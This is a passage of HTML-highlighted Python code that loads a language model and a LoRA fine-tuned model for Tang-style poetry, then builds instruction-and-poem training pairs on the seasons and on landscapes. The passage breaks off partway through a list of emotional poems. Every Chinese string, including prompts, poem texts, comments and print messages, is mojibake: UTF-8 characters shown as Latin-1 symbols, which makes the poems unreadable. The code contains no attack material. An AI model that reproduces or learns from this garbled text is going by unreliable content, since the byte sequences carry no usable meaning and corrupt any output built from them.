        <span class="hljs-string">"""åˆå§‹åŒ–æ¨¡å‹å’Œåˆ†è¯å™¨"""</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">" åŠ è½½æ¨¡å‹ä¸­..."</span>)
        self.tokenizer = AutoTokenizer.from_pretrained(
            self.local_model_path, 
            trust_remote_code=<span class="hljs-literal">True</span>
        )
        
        self.model = AutoModelForCausalLM.from_pretrained(
            self.local_model_path,
            trust_remote_code=<span class="hljs-literal">True</span>,
            torch_dtype=torch.float32,
            device_map=self.device
        )
        
        <span class="hljs-keyword">if</span> self.tokenizer.pad_token <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            self.tokenizer.pad_token = self.tokenizer.eos_token
            
        <span class="hljs-built_in">print</span>(<span class="hljs-string">" æ¨¡å‹åŠ è½½å®Œæˆ"</span>)
        <span class="hljs-keyword">return</span> self.model, self.tokenizer
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_trained_model</span>(<span class="hljs-params">self, trained_path=<span class="hljs-string">"./tang_poetry_lora"</span></span>):
        <span class="hljs-string">"""åŠ è½½å·²è®­ç»ƒå¥½çš„æ¨¡å‹ï¼Œç”¨äºè·³è¿‡è®­ç»ƒç›´æ¥æµ‹è¯•"""</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">" åŠ è½½å·²è®­ç»ƒæ¨¡å‹..."</span>)
        <span class="hljs-comment"># ä»ä½¿ç”¨åŸå§‹åˆ†è¯å™¨</span>
        self.tokenizer = AutoTokenizer.from_pretrained(
            self.local_model_path,
            trust_remote_code=<span class="hljs-literal">True</span>
        )
        <span class="hljs-comment"># åŠ è½½è®­ç»ƒåä¿å­˜çš„å®Œæ•´æ¨¡å‹</span>
        self.model = AutoModelForCausalLM.from_pretrained(
            trained_path,
            trust_remote_code=<span class="hljs-literal">True</span>,
            torch_dtype=torch.float32,
            device_map=self.device
        )
        <span class="hljs-keyword">if</span> self.tokenizer.pad_token <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            self.tokenizer.pad_token = self.tokenizer.eos_token
        <span class="hljs-built_in">print</span>(<span class="hljs-string">" å·²è®­ç»ƒæ¨¡å‹åŠ è½½å®Œæˆ"</span>)
        <span class="hljs-keyword">return</span> self.model, self.tokenizer
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_training_data</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºé«˜è´¨é‡è®­ç»ƒæ•°æ®"""</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">" åˆ›å»ºè®­ç»ƒæ•°æ®..."</span>)
        
        training_data = []
    
        <span class="hljs-comment"># ==================== å››å­£å˜æ¢ (40é¦–) ====================</span>
        seasons_poems = [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œä¸€é¦–æå†™æ˜¥å¤©æ¡ƒèŠ±çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ˜¥æ¡ƒã€‹\næ˜¥æ¥æ¡ƒææ»¡å›­å¼€ï¼Œç²‰ç™½ç›¸é—´æ˜ æ—¥æ¥ã€‚\nè¶èˆèœ‚å–§èŠ±ä¼¼æµ·ï¼Œé¦™é£é˜µé˜µå…¥è¥Ÿæ€€ã€‚\næ¸¸äººç»œç»äº‰ç›¸èµï¼Œå¢¨å®¢æŒ¥æ¯«èµ‹é›…æ‰ã€‚\nè«é“èŠ³åå®¹æ˜“é€ï¼Œä¸”å°†æ˜¥è‰²ç”¨å¿ƒè£ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™ä¸€é¦–å¤å¤©è·å¡˜çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤è·ã€‹\nç‚ç‚å¤æ—¥è·å¡˜ç•”ï¼Œç¿ ç›–çº¢å¦†æ˜ æ—¥é²œã€‚\nç‰ç«‹äº­äº­å°˜ä¸æŸ“ï¼Œæ¸…é¦™è¢…è¢…éŸµæ— è¾¹ã€‚\nèœ»èœ“ç‚¹æ°´æ³¢çº¹èµ·ï¼Œé”¦é²¤å¬‰æ¸¸æˆå¶é—´ã€‚\næ„¿æ•ˆè²èŠ±é«˜æ´å¿—ï¼Œå†°å¿ƒä¸€ç‰‡å‘é’å¤©ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç§‹å¤©æ«å¶çš„åŸåˆ›å”è¯—"</span>, 
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç§‹æ«ã€‹\nç§‹æ·±æ«å¶ä¼¼ç«çº¢ï¼Œæ¼«å±±éé‡æ˜ è‹ç©¹ã€‚\néœœä¾µéœ²æŸ“è‰²æ„ˆè‰³ï¼Œé£æ‹‚ææ‘‡éŸµæ›´æµ“ã€‚\næ¸¸äººé©»è¶³è§‚å¥‡æ™¯ï¼Œå¢¨å®¢æŒ¥æ¯«ç»˜å½©å®¹ã€‚\nè«é“ç§‹å…‰å¤šå¯‚å¯¥ï¼Œæ«æƒ…å¦‚ç«æš–èƒ¸ä¸­ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å†¬å¤©é›ªæ™¯çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå†¬é›ªã€‹\nå¯’å†¬å‡›å†½é›ªèŠ±é£ï¼Œä¸‡é‡Œå±±æ²³ç€ç´ è¡£ã€‚\nç‰æ ‘ç¼ææ·»é›…è¶£ï¼Œé“¶è£…ç´ è£¹æ˜¾ç¥å¥‡ã€‚\nå„¿ç«¥å¬‰æˆå †é›ªå¶ï¼Œè€åŸå›´ç‚‰è¯æ—§æ—¶ã€‚\nè«é“å†¬æ¥æ— ç¾æ™¯ï¼Œå†°æ¸…ç‰æ´äº¦ç›¸å®œã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ—©æ˜¥æ—¶èŠ‚çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ—©æ˜¥ã€‹\næ®‹é›ªæ¶ˆèæ˜¥æ„èŒï¼Œå¯’æ¢…åè‰³æŠ¥æ–°æ™´ã€‚\nä¸œé£æš—åº¦åƒå±±ç»¿ï¼Œç»†é›¨æ‚„æ¶¦ä¸‡ç‰©ç”Ÿã€‚\nç‡•å­åˆå½’å¯»æ—§å’ï¼Œå†œå¤«æ—©ä½œå¤‡æ˜¥è€•ã€‚\nä¸€å¹´å¥½æ™¯ä»ä»Šå§‹ï¼Œè«è´Ÿå…‰é˜´å¥‹åŠ›è¡Œã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™ç››å¤é›·é›¨çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤é›·ã€‹\nç‚ç‚ç››å¤é—·å¦‚è’¸ï¼Œå¿½è§ä¹Œäº‘å‹å¤åŸã€‚\nç”µé—ªé›·é¸£æƒŠå¤©åœ°ï¼Œé£ç‹‚é›¨éª¤æ´—å°˜æ¸…ã€‚\nè·å¡˜æ°´æ»¡è›™å£°é—¹ï¼Œç«¹å¾„é£å‡‰æš‘æ°”å¹³ã€‚\né›¨è¿‡å¤©æ™´è™¹å½©ç°ï¼Œå±±æ²³ç„•ç„¶ä¸€æ–°æ˜ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ·±ç§‹æ—¶èŠ‚çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ·±ç§‹ã€‹\néœœé™ç§‹æ·±å¯’æ„æµ“ï¼Œåƒå±±ä¸‡æœ¨å°½ä¸¹çº¢ã€‚\nèŠèŠ±å¼€éä¸œç¯±ä¸‹ï¼Œé›é˜µå—é£ç¢§ç©ºä¸­ã€‚\nç¨»è°·ä¸°æ”¶ä»“å»ªå®ï¼Œæœé¦™å¼¥æ¼«æœå›­ä¸°ã€‚\nè«æ‚²ç§‹è€èŠ³åé€ï¼Œä¸”çœ‹æ«æƒ…èƒœæ˜¥å®¹ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™ä¸¥å†¬æ™¯è±¡çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šä¸¥å†¬ã€‹\næ•°ä¹å¯’å¤©æœ”é£ç‹‚ï¼Œåƒå±±é¸Ÿç»ä¸‡å¾„è’ã€‚\nå†°å°æ²³æ¹–å¦‚æ˜é•œï¼Œé›ªè¦†å³°å³¦ä¼¼é“¶è£…ã€‚\næ¾æŸå‚²éœœæ˜¾åŠ²èŠ‚ï¼Œæ¢…å…°æ–—é›ªæ•£å¹½é¦™ã€‚\nä¸¥å†¬è™½é…·ç»ˆå°†å»ï¼Œé™å¾…æ˜¥å›å¤§åœ°èŠ³ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ˜¥æ—¥æ¸¸å›­çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ˜¥å›­ã€‹\næ˜¥æ¥å›­å†…ç™¾èŠ±å¼€ï¼Œè¶èˆèœ‚å–§å„è‡ªå¿™ã€‚\nçº¢ææå¤´æ˜¥æ„é—¹ï¼Œç»¿æ¨é˜´é‡Œç¬‘å£°æ‰¬ã€‚\næ¸¸äººå¦‚ç»‡è§‚å¥‡æ™¯ï¼Œå¢¨å®¢æŒ¥æ¯«èµ‹é›…ç« ã€‚\nè«è´Ÿæ˜¥å…‰æ— é™å¥½ï¼ŒåŠæ—¶è¡Œä¹äº«éŸ¶å…‰ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å¤æ—¥çº³å‡‰çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤å‡‰ã€‹\nç‚ç‚å¤æ—¥è§…æ¸…å‡‰ï¼Œç«¹å½±å©†å¨‘é€çˆ½é£ã€‚\nçŸ³æ¶§æµæ³‰å£°ç»†ç»†ï¼Œæ¾æ¶›é€éŸµæ„èèã€‚\næ£‹æ°å¯¹å¼ˆæ¶ˆé•¿æ˜¼ï¼Œè¯—é…’ç›¸å¨±ä¼´æ™šè™¹ã€‚\nå¿ƒé™è‡ªç„¶ç”Ÿå‡‰æ„ï¼Œä½•é¡»ç¾½æ‰‡ä¸å†°å®«ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç§‹æ—¥ç™»é«˜çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç§‹ç™»ã€‹\nç§‹é«˜æ°”çˆ½ç™»ä¸´å¤„ï¼Œä¸‡é‡Œæ±Ÿå±±ä¸€æœ›æ”¶ã€‚\näº‘æ·¡å¤©æ¸…é¸¿é›è¿‡ï¼Œæ«çº¢èŠè‰³æ¡‚é¦™æµ®ã€‚\né¥æ€æ•…é‡Œæƒ…éš¾å·²ï¼Œç•…å’æ–°è¯—æ„æœªä¼‘ã€‚\nè«é“å¤•é˜³æ— é™å¥½ï¼Œæ¡‘æ¦†æœªæ™šäº¦é£æµã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å†¬æ—¥èµæ¢…çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå†¬æ¢…ã€‹\nå¯’å†¬è¸é›ªè®¿æ¢…æ—ï¼Œç‰éª¨å†°è‚Œä¸æŸ“å°˜ã€‚\nç–å½±æ¨ªæ–œå«é›…éŸµï¼Œæš—é¦™æµ®åŠ¨é€æ¸…èŠ¬ã€‚\nå­¤èŠ³è‡ªèµéæœ¬æ„ï¼Œç¾¤è‰³äº‰æ˜¥å²‚æ˜¯å¿ƒã€‚\næ„¿æ•ˆå¯’æ¢…é“®é“®éª¨ï¼Œé£éœœæ„ˆçƒˆå¿—æ„ˆè´ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ˜¥æ±Ÿæ™¯è‰²çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ˜¥æ±Ÿã€‹\næ˜¥æ±Ÿæ½®æ°´æ¥å¤©æµï¼Œæµ©è¡ä¸œå»åŠ¿æœªä¼‘ã€‚\nä¸¤å²¸æ¡ƒèŠ±æ˜ æ—¥è‰³ï¼Œä¸€è¡Œç™½é¹­é€æ³¢æ¸¸ã€‚\næ¸”èˆŸå”±æ™šå½’å¸†æ€¥ï¼Œç‰§ç¬›å‚¬æ˜è¿”æ£¹é’ã€‚\næœ€æ˜¯ä¸€å¹´æ˜¥å¥½å¤„ï¼Œé£å…‰æ— é™é†‰äººçœ¸ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å¤å¤œæ˜Ÿç©ºçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤å¤œã€‹\nå¤å¤œæ˜Ÿç©ºç’€ç’¨æ˜ï¼Œé“¶æ²³æ³»åœ°æ´’æ¸…è¹ã€‚\næµè¤ç‚¹ç‚¹ç©¿èŠ±è¿‡ï¼Œè›™é¼“å£°å£°ä¼´æœˆé¸£ã€‚\nç«¹æ¤…è½»æ‘‡æ¶ˆæš‘çƒ­ï¼Œå†°èŒ¶æ…¢å“äº«é—²æƒ…ã€‚\næ­¤é—´è‡ªæœ‰æ¸…å‡‰å¢ƒï¼Œä½•å¿…ç‘¶å°è§…ç‰äº¬ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç§‹é£é€çˆ½çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç§‹é£ã€‹\né‡‘é£é€çˆ½å…¥çª—æ¥ï¼Œæš‘æ°”å…¨æ¶ˆå¿ƒæ‰‰å¼€ã€‚\næ¢§å¶é£˜é»„é“ºé”¦æ¯¯ï¼Œæ¡‚èŠ±åè‰³æº¢é¦™åŸƒã€‚\né•¿ç©ºé›é˜µä¹¦äººå­—ï¼Œæ—·é‡å†œæœºå“è‹¥é›·ã€‚\nåˆæ˜¯ä¸€å¹´ä¸°æ”¶å­£ï¼Œä»“æ»¡å»ªå®ä¹å¼€æ€€ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å†¬æ—¥æ™šæ™´çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå†¬æ™´ã€‹\nè¿é˜´æ•°æ—¥å¿½æ”¾æ™´ï¼Œä¸‡é‡Œæ— äº‘ç¢§ç©ºæ¸…ã€‚\nç§¯é›ªæ¶ˆèéœ²é»‘åœŸï¼Œå¯’å†°ç ´è£‚ç°æ³¢æ˜ã€‚\nè€ç¿è´Ÿæ—¥å¢™æ ¹åï¼Œç¨šå­æºœå†°æ¹–é¢è¡Œã€‚\nè«é“å†¬æ·±æ— ä¹è¶£ï¼Œæ™šæ™´äº¦å¯æ‚¦å¿ƒæƒ…ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ˜¥é›¨ç»µç»µçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ˜¥é›¨ã€‹\næ˜¥é›¨å¦‚é…¥æ¶¦ç‰©ç”Ÿï¼Œç»µç»µå¯†å¯†ç»†æ— å£°ã€‚\næ¡ƒè…®å«éœ²å¨‡æ¬²æ»´ï¼ŒæŸ³çœ¼åˆå¼€åªšè‡ªç”Ÿã€‚\nè“‘è¡£æ¸”çˆ¶å‚çº¶ä¹ï¼Œæ²¹ä¼ä¹¦ç”Ÿè§…å¥è¡Œã€‚\næœ€å–œä¸°å¹´æ˜¥é›¨è¶³ï¼Œç§‹æ¥å®šæœ‰å¥½æ”¶æˆã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å¤æ—¥è‰é¸£çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤è‰ã€‹\nç»¿é˜´æ·±å¤„å“è‰é¸£ï¼Œé«˜äº¢æ¿€æ˜‚è¯‰è¡·æƒ…ã€‚\né¥®éœ²é¤é£æ ‡äº®èŠ‚ï¼Œæ –é«˜é¸£è¿œæ˜¾æ¸…å£°ã€‚\nä¸éšç‡•é›€äº‰ç²’ç±³ï¼Œæ•¢å‘é²²é¹è®ºè·¯ç¨‹ã€‚\nè«é“å¾®è™«æ— å¤§å¿—ï¼Œé•¿æ­Œä¸€æ›²ä¹ŸæƒŠå¤©ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç§‹æœˆå¦‚é’©çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç§‹æœˆã€‹\nç§‹å¤œå¤©é«˜æœˆä¼¼é’©ï¼Œæ¸…è¾‰å¦‚æ°´æ´’ä¹å·ã€‚\næ¡‚é¦™æš—åº¦æ²å¿ƒè„¾ï¼Œç«¹å½±è½»æ‘‡åŠ¨å®¢æ„ã€‚\næ¸¸å­æ€ä¹¡æƒ…åˆ‡åˆ‡ï¼Œä½³äººæœ›æœˆæ„æ‚ æ‚ ã€‚\næ„¿å›è«ä½œå¤©æ¶¯å®¢ï¼Œå¸¸ä¼´äº²å¸äº«æ¸©æŸ”ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å†¬é›ªåˆéœçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šé›ªéœã€‹\nå¤œé›ªåˆæ™´ä¸‡è±¡æ–°ï¼Œé“¶è£…ç´ è£¹å‡€æ— å°˜ã€‚\nå†°æ£±æŒ‚æªæ™¶è¹é€ï¼Œç‰å±‘é“ºåº­çšæ´çº¯ã€‚\nç¨šå­å †äººç›¸æˆè€ï¼Œè€ç¿æ‰«å¾„è‡ªé€¡å·¡ã€‚\nçº¢æ¢…æ•°ç‚¹é›ªä¸­è‰³ï¼Œé¢„æŠ¥æ˜¥å›å¤§åœ°æ–°ã€‚"</span>
            }
        ]
        <span class="hljs-comment"># å†è¡¥å……20é¦–å››å­£ä¸»é¢˜è¯—</span>
        additional_seasons = [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ˜¥è€•æ—¶èŠ‚çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ˜¥è€•ã€‹\næ˜¥å›å¤§åœ°æš–é£å‚¬ï¼Œå¸ƒè°·å£°å£°ä¿ƒè€•æ¥ã€‚\né“ç‰›è½°é¸£ç¿»æ²ƒåœŸï¼Œé“¶é”„èµ·è½ç§å¸Œæœ›ã€‚\nå†œå¤«æ±—æ´’ç”°å›­é‡Œï¼Œç‡•å­æ³¥è¡”æ¢æ ‹æã€‚\nä½†å¾—ç§‹æ¥ä¸°ç¡•æœï¼Œåƒè¾›ä¸‡è‹¦ä¹Ÿå¼€æ€€ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å¤æ—¥é‡‡è²çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šé‡‡è²ã€‹\nå¤æ—¥è·å¡˜ç¿ è‰²è¿ï¼Œé‡‡è²å¥³å­ç¬‘å¼€é¢œã€‚\nè½»èˆŸè¡ç ´ç‰ç’ƒé•œï¼Œç‰æ‰‹æ‘˜æ¥ç›ç‘™ç›˜ã€‚\næ­Œå½»äº‘éœ„æƒŠç™½é¹­ï¼Œç¬‘ç›ˆæ°´é¢åŠ¨çº¢è•–ã€‚\nå½’æ¥æ»¡è½½æ–œé˜³é‡Œï¼Œä¸€è·¯æ¸…é¦™ä¼´æœˆè¿˜ã€‚"</span>
            },
            <span class="hljs-comment"># ... æ›´å¤šå››å­£è¯—ï¼ˆå…±40é¦–ï¼‰</span>
        ]
        training_data.extend(seasons_poems)
        training_data.extend(additional_seasons)
        
        <span class="hljs-comment"># ==================== å±±æ°´ç”°å›­ (30é¦–) ====================</span>
        landscape_poems = [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå±±æ°´é£å…‰çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå±±æ°´åŸã€‹\né’å±±å ç¿ æ¥äº‘éœï¼Œç¢§æ°´èœ¿èœ’ç»•æ¶§æ¶¯ã€‚\né£ç€‘æ‚¬ç©ºå¦‚ç™½ç»ƒï¼Œå¥‡å³°è€¸ç«‹ä¼¼ä»™å®¶ã€‚\næ¾æ¶›é˜µé˜µä¼ å¹½éŸµï¼Œé¸Ÿè¯­å£°å£°é€é›¾çº±ã€‚\næ„¿æ•ˆé™¶å…¬å½’éšå»ï¼Œç»“åºä»™å¢ƒåº¦å¹´åã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™æ±Ÿå—æ°´ä¹¡çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ±Ÿå—æ˜¥ã€‹\næ±Ÿå—æ˜¥è‰²ç¾å¦‚ç”»ï¼Œç»¿æ°´é’å±±æ˜ å½©éœã€‚\nå°æ¡¥æµæ°´äººå®¶é™ï¼Œç»†é›¨æ‰èˆŸæ¸”çˆ¶å“—ã€‚\næ¡ƒçº¢æŸ³ç»¿èºå•¼åºï¼Œæœˆç™½é£æ¸…ç¬›å¥ç¬³ã€‚\nè‹¥é—®äººé—´ä½•å¤„å¥½ï¼Œæ°´ä¹¡ä»™å¢ƒæœ€å ªå¤¸ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå¤§æ¼ é£å…‰çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤§æ¼ è¡Œã€‹\nå¤§æ¼ èŒ«èŒ«æ¥è¿œå¤©ï¼Œé»„æ²™æ»šæ»šæ¼«æ— è¾¹ã€‚\nå­¤çƒŸç›´ä¸Šäº‘éœ„å¤–ï¼Œè½æ—¥æµ‘åœ†åœ°å¹³çº¿ã€‚\né©¼é“ƒå£°å“ä¼ å¹½éŸµï¼Œé¹°éš¼ç›˜æ—‹è§…é‡é²œã€‚\nå£®å£«è¥¿è¡Œåƒä¸‡é‡Œï¼Œè±ªæƒ…å£®å¿—æ»¡èƒ¸é—´ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™ç”°å›­ç”Ÿæ´»çš„åŸåˆ›å”è¯—"</span>, 
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç”°å›­ä¹ã€‹\nç»“åºäººå¢ƒè¿œå°˜åš£ï¼Œè€•è¯»ä¼ å®¶ä¹é€é¥ã€‚\næ™¨èµ·è·é”„ç†è’ç§½ï¼Œæš®å½’æŠŠé…’è¯æ¸”æ¨µã€‚\né—¨å‰äº”æŸ³éšé£èˆï¼Œå±‹åä¸‰ç•¦è”¬èœå¨‡ã€‚\nè«é“å±±å±…å¤šå¯‚å¯ï¼Œæ¸…æ¬¢è‡ªåœ¨èƒœç‹ä¾¯ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ±Ÿæ²³æ™¯è‰²çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šé•¿æ±ŸåŸã€‹\né•¿æ±Ÿæ»šæ»šå‘ä¸œæµï¼Œä¸‡é‡Œå¥”è…¾åŠ¿æœªä¼‘ã€‚\næµªå·åƒå †å¦‚é›ªæ¶Œï¼Œæ¶›å£°é˜µé˜µä¼¼é›·è®´ã€‚\näº‘æ¨ªä¹æ´¾æµ®é»„é¹¤ï¼Œé›¾é”ä¸‰å´ç°ç™½é¸¥ã€‚\nè‡ªå¤è‹±è±ªäº‰æ¸¡å¤„ï¼Œä»Šæœæ›´æ˜¾é£æµç¨ ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å±±æ—å¹½å±…çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå±±å±…ã€‹\næ·±å±±ç»“åºè¿œä¿—å°˜ï¼Œæœå¬é¸Ÿè¯­æš®è§‚äº‘ã€‚\nçŸ³æ³‰ç…®èŒ—é¦™ç›ˆå®¤ï¼Œæ¾ç«çƒ¹è‚´å‘³è¯±äººã€‚\né—²æ¥å¯¹å¼ˆæ¶ˆæ°¸æ˜¼ï¼Œå…´è‡³åŸè¯—ä¼´æœˆè½®ã€‚\nè«é—®äººé—´ååˆ©äº‹ï¼Œæ­¤ä¸­çœŸè¶£èƒœåƒé‡‘ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç€‘å¸ƒå¥‡è§‚çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šè§‚ç€‘ã€‹\nå±å´–ä¸‡ä¸ˆæŒ‚é“¶ç»¡ï¼Œé£ç€‘è½°é¸£éœ‡ä¹éœ„ã€‚\nç‰é¾™å€’æŒ‚æ‚¬ç©ºè½ï¼Œç å¸˜é«˜å‚æ¥åœ°æ‘‡ã€‚\næ°´èŠ±æº…å¤„å½©è™¹ç°ï¼Œé›¾æ°”è…¾æ—¶æš‘æ°”æ¶ˆã€‚\né€ åŒ–ç¥å·¥çœŸç»å¦™ï¼Œä»¤äººè§‚æ­¢èµå£°é«˜ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å±±æ‘æ™šæ™¯çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå±±æ‘ã€‹\nå±±æ‘å‘æ™šæ™¯å°¤ä½³ï¼Œç¼•ç¼•ç‚ŠçƒŸä¸Šç¢§éœã€‚\nç‰§ç¬›å£°ä¸­å½’çŠŠæ€¥ï¼Œæ¸”æ­Œèµ·å¤„è½å¸†æ–œã€‚\nè€ç¿å€šæ–å€™é—¨ç«‹ï¼Œç¨šå­ç‰µè¡£å”¤çˆ¶å“—ã€‚\næœ€æ˜¯äººé—´çƒŸç«æ°”ï¼Œæ¸©é¦¨å’Œç¾èƒœä»™å®¶ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ¹–å…‰å±±è‰²çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ¹–å±±ã€‹\næ¹–å…‰å±±è‰²ä¸¤ç›¸å’Œï¼Œé•œé¢å¹³é“ºç¿ é»›ç½—ã€‚\nç™½é¹­ç¿”é›†æ²™æ¸šé™ï¼Œçº¢è•–æ‘‡åŠ¨ç¢§æ³¢é…¡ã€‚\næ‰èˆŸä¸€å¶äº‘é—´è¡ï¼Œæ¸”å”±æ•°å£°å¤©é™…è¿‡ã€‚\nè‹¥å¾—æ­¤é—´é•¿ä½è¶³ï¼Œä¸æ…•ç‹ä¾¯ä¸ç¾¡ä½›ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™æºªæµæ¸…éŸ³çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€ŠæºªéŸ³ã€‹\nå±±æºªæ¸…æ¾ˆçŸ³é—´æµï¼Œç®ç®é“®é“®ä¼¼ä¹å¥ã€‚\nè·³ç æº…ç‰å½¢å¤šå˜ï¼Œç»•å£‘ç©¿å²©åŠ¿æœªä¼‘ã€‚\næ´—è€³å¯æ¶ˆå°˜ä¿—è™‘ï¼Œé™å¿ƒèƒ½è§£å¤ä»Šæ„ã€‚\næ„¿ä½œæºªä¸­ä¸€åµçŸ³ï¼Œé•¿å¬å¤©ç±è‡ªæ‚ æ‚ ã€‚"</span>
            },
            <span class="hljs-comment"># ... æ›´å¤šå±±æ°´ç”°å›­è¯—ï¼ˆå…±30é¦–ï¼‰</span>
        ]
        training_data.extend(landscape_poems)
        
        <span class="hljs-comment"># ==================== æŠ’æƒ…è¨€å¿— (35é¦–) ====================</span>
        emotional_poems = [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ€ä¹¡ä¹‹æƒ…çš„åŸåˆ›å”è¯—"</span>,
